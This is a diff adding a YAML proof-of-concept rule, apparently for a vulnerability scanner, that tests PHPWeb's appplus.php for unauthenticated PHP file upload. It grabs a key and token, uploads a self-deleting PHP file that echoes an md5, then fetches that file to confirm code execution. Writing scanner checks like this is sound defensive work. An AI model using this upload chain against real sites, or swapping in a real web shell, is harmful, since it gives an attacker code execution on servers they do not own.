@@ -1,0 +1,75 @@
+name: poc-yaml-phpweb-appplus-php-upload
+manual: true
+transport: http
+set:
+    f1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /base/post.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: act=appcode
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"k=") && response.body.bcontains(b"t=")
+        output:
+            search: '"k=(?P<key>\\w+)&t=(?P<token>\\d+)".bsubmatch(response.body)'
+            key: search["key"]
+            token: search["token"]
+            md: md5(key + token)
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /base/appplus.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"file\"; filename=\"{{randname}}.php\"\r\n\
+                Content-Type: application/octet-stream\r\n\
+                \r\n\
+                <?php echo md5({{f1}});unlink(__FILE__);?>\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"act\"\r\n\
+
+                upload\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"r_size\"\r\n\
+
+                41\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"t\"\r\n\
+
+                {{token}}\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"m\"\r\n\
+
+                {{md}}\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"path\"\r\n\
+
+                upload\r\n\
+                ------WebKitFormBoundary{{rboundary}}--\r\n\
+                "
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b".php")
+        output:
+            search: '"upload/(?P<fname>\\w+.php)".bsubmatch(response.body)'
+            fname: search["fname"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /upload/{{fname}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
+expression: r0() && r1() && r2()
+detail:
+    author: sharecast
+    links:
+        - https://github.com/apachecn/sec-wiki/blob/4e683a4d09daefad2e294255703223f56f5fd6bd/doc/unclassified/zhfly3089.md
